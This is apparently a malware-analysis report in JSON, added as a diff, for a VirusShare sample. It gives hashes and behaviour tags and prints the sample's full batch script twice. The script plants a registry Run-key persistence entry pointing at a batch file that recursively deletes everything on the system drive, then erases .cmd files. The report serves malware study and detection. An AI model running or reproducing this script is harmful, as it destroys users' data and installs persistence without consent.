@@ -1,0 +1,42 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "echo off \necho  Windows Registry Editor Version 5.00o > %homedrive%\\windows\\y.reg \necho.>> %homedrive%\\windows\\y.reg \necho  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >> %homedrive%\\windows\\y.reg \necho  \"ImagePath\"=\"%homedrive%\\\\windows\\\\system_32.bat\">> %homedrive%\\windows\\y.reg \nreg import %homedrive%\\windows\\y.reg \necho erase /q /s %homedrive%\\*.* >> \"%homedrive%\\\\windows\\\\system_32.bat\" \nerase /q *.cmd"
+    },
+    "filename": "VirusShare_331c9831aec6d06aec3e5026a77ab513",
+    "filesize": 440,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "331c9831aec6d06aec3e5026a77ab513",
+        "sha1": "45bb74e27da777992dbf6cabaeed0b1b2eecc954",
+        "sha256": "6fc67a093ce520cbc8cf06624cdd9e7d8328aa916479c55e744fc602817d63ae"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "echo off ",
+            "echo  Windows Registry Editor Version 5.00o > %homedrive%\\windows\\y.reg ",
+            "echo.>> %homedrive%\\windows\\y.reg ",
+            "echo  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >> %homedrive%\\windows\\y.reg ",
+            "echo  \"ImagePath\"=\"%homedrive%\\\\windows\\\\system_32.bat\">> %homedrive%\\windows\\y.reg ",
+            "reg import %homedrive%\\windows\\y.reg ",
+            "echo erase /q /s %homedrive%\\*.* >> \"%homedrive%\\\\windows\\\\system_32.bat\" ",
+            "erase /q *.cmd"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.256354",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
